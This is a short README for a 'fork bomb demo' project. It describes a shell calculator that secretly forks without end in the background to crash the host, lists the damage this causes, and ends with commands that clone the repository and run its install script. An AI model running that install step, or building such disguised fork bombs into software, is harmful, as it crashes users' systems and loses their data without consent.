# Shellmates Calculator (Fork Bomb Demo)

## Overview

This project contains a fork bomb disguised as a simple shell-based calculator. The application appears to function normally while secretly executing a fork bomb attack in the background.

## How It Works

### Process Flow:
1. **Installation** - User installs and runs the calculator application
2. **Execution**:
   - Parent process runs as a normal calculator
   - Child process is created and sleeps for 2 seconds
   - After delay, child process enters infinite fork loop
3. **Result** - System resources are exhausted, leading to crash

### Technical Details:
Parent Process (Calculator)
↓
Child Process (Sleep 2s)
↓
Infinite Fork Loop
↓
System Crash


## Dangers and Risks

### Immediate Impacts:
- **System Instability** - Rapid process creation freezes or crashes the host system
- **Resource Exhaustion** - Complete CPU and memory consumption
- **Data Loss** - Unsaved work may be lost during system failure
- **Service Disruption** - All running applications and services become unresponsive

### Recovery Requirements:
- **Hard Reboot** - Affected systems typically require forced restart
- **Potential Data Corruption** - File system may require repair

## Installation

```bash
git clone https://github.com/YuniqueCode07/Shellmates_Calculator.git
cd Shellmates-Calculator
chmod +x install.sh
./install.sh
